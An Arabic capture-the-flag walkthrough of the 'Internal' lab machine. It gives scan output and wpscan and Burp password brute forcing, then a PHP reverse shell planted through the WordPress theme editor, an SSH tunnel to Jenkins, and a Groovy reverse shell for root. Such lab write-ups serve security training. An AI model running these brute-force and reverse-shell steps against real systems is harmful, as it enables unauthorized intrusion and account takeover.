
---

### Internal ctf

![](222b3e855f88a482c1267748f76f90e0.jpeg)

### 1. نجهز ال ip

```
sudo nano /etc/hosts
```

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20213626.png)

2.scan
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ nmap -sC -sV 10.49.148.219   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 21:39 EET  
Nmap scan report for internal.thm (10.49.148.219)  
Host is up (0.26s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)  
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)  
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)  
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-title: Apache2 Ubuntu Default Page: It works  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 21.57 seconds
```
لقد عرفت ان port 80 . 22 open
```

┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ gobuster dir -u http://10.49.148.219 -w /usr/share/wordlists/dirb/common.txt  
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://10.49.148.219  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.hta                 (Status: 403) [Size: 278]  
/.htaccess            (Status: 403) [Size: 278]  
/.htpasswd            (Status: 403) [Size: 278]  
/blog                 (Status: 301) [Size: 313] [--> http://10.49.148.219/blog/]  
/index.html           (Status: 200) [Size: 10918]  
/javascript           (Status: 301) [Size: 319] [--> http://10.49.148.219/javascript/]  
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.49.148.219/phpmyadmin/]  
/server-status        (Status: 403) [Size: 278]  
/wordpress            (Status: 301) [Size: 318] [--> http://10.49.148.219/wordpress/]  
Progress: 4613 / 4613 (100.00%)  
===============================================================  
Finished  
===============================================================
```

هندخل علي /blog

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20214654.png)

log in اما ننزل نلاقي

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20214916.png)

بعد اما ندخل عليه ونجرب ندخل الحساب نلاقي انه بيتأكد من Username الاول فبيظهر الخطأ ده

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20215219.png)

فهنخمن Username بادوات زي hydra , wpscan , Burp Suite بس انا هستخدم الاسهل
```

┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ wpscan --url http://internal.thm/blog/wp-login.php -e u 

```
![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-07%20223843.png)

ولو مشتغلش او عملت كثير وما اشتغل اعمل — no-update

```
wpscan --url http://internal.thm/blog/wp-login.php -e u --no-update

```
ده بيجيب Username فهنخمن الباسورد

```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

![](https://github.com/Red-Bugs/Internal-ctf/blob/72311f2b3961ab492f0f545890cc0c86d5cafc79/Screenshot%202025-12-08%20145053.png)

واخيرا تم تسجيل الدخول

![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/1_l-GlDWbhwfVFEOaJ5-bEmg.png)

نذهب الي The email is correct ثم الي Appearance

![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20154649.png)

ثم نذهب الي Editor Theme

![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155152.png)

ثم الي index.php

![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155421.png)

نضع reverse-shell.php في المكان كود php

![](https://github.com/Red-Bugs/Internal-ctf/blob/069c96cbaaff2d79826e8178f1735d71d2cf77b8/Screenshot%202025-12-08%20155529.png)

وبعد اما تحط كود php المتعدل نعمل Update File
ونروح اي صفحة بيشتغل الكودعليها بعد تجهيز nc

```
┌──(kali㉿kali)-[~/Downloads/THM]
└─$ nc -lvnp 1234
```
ودي مثال علي الرابط [http://internal.thm/blog/index.php](http://internal.thm/blog/index.php) تقدر تدخل علي اي حاجه بيشتغل فيها [index.php](http://internal.thm/blog/index.php)

وبعد اما نوصل لل reverse-shell ندخل علي opt

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-09%20203614.png)

ودي الياسورد و اليوزر للssh فهنسجل دخول علي ssh
```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ ssh aubreanna@10.49.182.209
```
وبعد الاتصال هنعمل

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20162835.png)
```
aubreanna@internal:~$ cat jenkins.txt                             
Internal Jenkins service is running on 172.17.0.2:8080    
aubreanna@internal:~$
```
ده معناه الي احني نقدر نشفل الInternal Jenkins service علي localhos port8080 ونقدر نعمل ده بssh

```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ ssh -L 8080:localhost:8080 aubreanna@10.49.182.209

```
وبعد كده هنشغل localhost:8080 ولو مشتغلش ادخل علي localhost منغير port

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20164101.png)

وأول حاجه هتيجي في بلناه هي نبحث علي default user Jenkins وهنلاقيه `**admin**`

ونحاول نخمن الباسورد من الBurp Suite بعد تشغيل متصفح ال Burp Suite هنتيع الخطوات دي مع اكيد عمل الطلب بعد الخطوة 1

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20165637.png)

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20165919.png)

في الخطوه 2 هنحدد بعد password= لان الي بعده في الطلب ده password اصلا ونفذ الخطوه 3 ثم 4 وفي 4 هتختار الwordlists و الافضل تبقى rockyou.txt لانها كبييييييييرة وقويه و المسار بتعها هو /usr/share/wordlists/rockyou.txt

وتعمل

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20170853.png)

![](https://github.com/Red-Bugs/Internal-ctf/blob/a3a8f7f8c30c08048f5c1dd45b5aae701cab6318/Screenshot%202025-12-08%20184132.png)

بعد اما تدوس علي length هتلاقي فرق كبير بين الباسورد الصح و الغلط وعمل iog in

![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204211.png)

هنروح هنا وبهدين هنا

![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204243.png)

![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204307.png)

هتلاقي اسم لغة البرمجه [Groovy script](http://www.groovy-lang.org) ابحث علي كود لعمل reverse-shell Groovy وحطه هنه بعد التعديل

![](https://github.com/Red-Bugs/Internal-ctf/blob/0fccfe271b64bde9518481bfdf6a75f5e929c504/Screenshot%202025-12-09%20204353.png)

وقبل عمل Run شغل nc

```
┌──(kali㉿kali)-[~/Downloads/THM]  
└─$ nc -lvnp 9001  
listening on [any] 9001 ...
```

وعمل Run

![](https://github.com/Red-Bugs/Internal-ctf/blob/aeb9fcd3c0ebce543c2b62204d40a4527261e507/Screenshot%202025-12-09%20205307.png)

وكده حصلت علي root

![](https://github.com/Red-Bugs/Internal-ctf/blob/912fb2e2911487b88137cccf52c9dc5ab801cf88/Screenshot%202025-12-09%20205307.png)

ثم تهانينا علي الانتهاء
